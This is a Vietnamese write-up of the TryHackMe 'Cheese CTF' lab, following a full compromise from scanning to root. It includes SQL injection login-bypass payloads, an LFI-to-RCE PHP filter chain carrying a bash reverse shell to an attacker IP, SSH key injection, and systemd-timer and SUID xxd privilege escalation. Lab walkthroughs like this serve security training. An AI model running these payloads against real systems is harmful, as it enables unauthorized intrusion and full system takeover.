# Cheese CTF – TryHackMe Write-up

## 1. Recon (Khám phá ban đầu)

* Sử dụng **nmap** để quét dịch vụ:

  ```bash
  nmap -sC -sV -Pn <target_ip>
  ```
* Kết quả: nhiều port trả về banner giả, nhưng **port 80** chạy web app thực sự (Cheese Shop).

---

## 2. SQL Injection – Bypass Login

* Trên web có form login. Thử các payload classic:

  ```sql
  ' OR '1'='1'-- -
  ```
* Hoặc

  ```sql
  ' || '1'='1'-- -
  ```
* Thành công bypass và vào được **admin panel**.

---

## 3. LFI → RCE qua PHP Filter Chain

* Trong admin panel có `secret-script.php?file=` → có thể đọc file.
* Test:

  ```
  http://<ip>/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
  ```
* Thấy được code PHP gốc → LFI confirmed.
* Tạo payload RCE bằng tool [`php_filter_chain_generator.py`](https://github.com/synacktiv/php_filter_chain_generator):

  ```bash
  python3 php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\""); ?>'
  ```
* Lấy chuỗi payload và dùng trong URL → reverse shell về **nc listener**:

  ```bash
  nc -lvnp 4444
  ```
* Thu được shell `www-data`.

---

## 4. Từ www-data → user comte

* Check file writable:

  ```bash
  find /home/comte/.ssh/ -type f -writable
  ```
* Thấy `authorized_keys` writable → tạo key SSH:

  ```bash
  ssh-keygen -t rsa -f mykey
  cat mykey.pub >> /home/comte/.ssh/authorized_keys
  ssh -i mykey comte@<target_ip>
  ```
* Vào được user `comte`.

---

## 5. Privilege Escalation – comte → root

* Check sudo quyền:

  ```bash
  sudo -l
  ```
* Thấy có quyền chạy `systemctl` liên quan tới **exploit.timer**.
* Kiểm tra file unit `exploit.timer`, sửa `OnBootSec=` thành:

  ```ini
  OnBootSec=1s
  ```
* Reload và start timer:

  ```bash
  sudo systemctl daemon-reload
  sudo systemctl start exploit.timer
  ```
* Kết quả: `/opt/xxd` được tạo với SUID root.

---

## 6. Root bằng SUID `xxd`

* `xxd` là binary dump hex → có SUID root.
* Có thể dùng để đọc file root flag:

  ```bash
  /opt/xxd /root/root.txt | xxd -r
  ```
* Hoặc ghi SSH key vào `/root/.ssh/authorized_keys` để SSH root.

---

## 7. Tổng kết

### Khai thác chính:

1. **Recon (nmap)** → tìm web app.
2. **SQLi** → bypass login.
3. **LFI** → đọc source.
4. **PHP filter chain RCE** → shell www-data.
5. **SSH key injection** → user comte.
6. **Systemd timer exploit** → tạo SUID binary.
7. **SUID xxd abuse** → root flag.

### Tool dùng:

* `nmap`, `php_filter_chain_generator.py`, `nc`, `ssh-keygen`, `systemctl`, `xxd`

### Khái niệm học được:

* **SQLi**: chèn query để bypass/trích xuất DB.
* **LFI**: load file hệ thống.
* **RCE**: thực thi code từ xa.
* **Reverse shell**: kết nối shell ngược về attacker.
* **Privilege Escalation**: leo quyền.
* **SUID binary**: binary chạy với quyền owner (root).
* **Systemd timer abuse**: khai thác config để chạy code với root.

---

✅ Kết quả: Rooted thành công hệ thống!
